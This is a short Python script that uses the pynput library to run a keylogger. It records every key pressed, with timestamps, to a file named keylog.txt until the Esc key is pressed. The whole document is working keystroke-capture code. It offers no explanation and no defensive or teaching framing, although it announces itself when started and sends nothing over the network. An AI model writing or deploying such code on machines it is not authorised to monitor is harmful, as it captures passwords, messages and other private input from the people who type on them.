import pynput
from pynput.keyboard import Key, Listener
import logging

"""Set up logging"""
logging.basicConfig(filename='keylog.txt',level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    try:
        logging.info(f'Key pressed:{key.char}')
    except AttributeError:
        logging.info(f'Special key pressed:{key}')
def on_release(key):
    """Stop listener when Esc key is pressed."""
    if key == Key.esc:
        #Stop listener
        return False
def start_keylogger():   
    """Create and start Listener"""
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
if __name__ == "__main__":
    print("Starting keylogger... Press Esc to stop.")
    start_keylogger()